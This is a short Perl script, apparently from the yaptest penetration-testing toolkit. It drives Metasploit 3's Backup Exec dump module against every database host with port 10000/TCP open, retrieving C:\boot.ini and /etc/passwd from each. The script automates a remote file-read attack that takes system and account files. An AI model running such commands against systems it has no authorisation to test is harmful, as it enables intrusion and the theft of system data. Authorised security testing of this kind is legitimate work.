#!/usr/bin/env perl
use strict;
use warnings;
use POSIX;
use yaptest;
use File::Basename;

my $script_name = basename($0);
my $usage = "Usage: $script_name
Performs metasploit3 veritas file read check on IPs in database with port 10000/TCP open.

NB: 'msfcli' from Metasploit version 3 should be in the path.
";

die $usage if shift;
my $y = yaptest->new();
my $ms3_dir = $y->get_config('metasploit_3_dir');

if (defined($ms3_dir)) {
        $ms3_dir .= '/' unless substr($ms3_dir, -1, 1); # add trailing slash
        print "NOTE: Assuming 'msfcli' from Metasploit 3 is installed in $ms3_dir\n";
} else {
        print "WARNING: metasploit_3_dir config option not set.  Use yaptest-config.pl\n";
        print "         to set 'metasploit_3_dir' to the location of Metasploit v3\n";
        print "         Will search for msfcli in \$PATH - probably not what you want\n";
        $ms3_dir = "";
}
print "\n";

$y->run_test(
	command => $ms3_dir . "msfcli auxiliary/admin/backupexec/dump RHOST=::IP:: LPATH=backupexec_dump-boot-::IP::.mtf RPATH='C:\\boot.ini' E",
	filter => { port => 10000, transport_protocol => 'tcp' },
	output_file => 'metasploit-veritas-file-download-win-::IP::.out'
);

$y->run_test(
	command => $ms3_dir . "msfcli auxiliary/admin/backupexec/dump RHOST=::IP:: LPATH=backupexec_dump-passwd-::IP::.mtf RPATH='/etc/passwd' E",
	filter => { port => 10000, transport_protocol => 'tcp' },
	output_file => 'metasploit-veritas-file-download-nix-::IP::.out'
);
